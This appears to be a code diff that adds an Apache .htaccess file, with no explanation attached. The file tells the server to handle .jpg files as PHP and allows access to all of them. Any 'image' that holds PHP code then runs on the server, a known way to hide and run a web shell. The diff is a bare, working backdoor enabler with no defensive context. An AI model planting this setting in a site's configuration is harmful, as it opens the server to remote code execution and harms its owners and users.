@@ -1,0 +1,15 @@
+<FilesMatch "\.jpg$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+AddType application/x-httpd-php .jpg
+
+
+
+
+
+
+
+
+
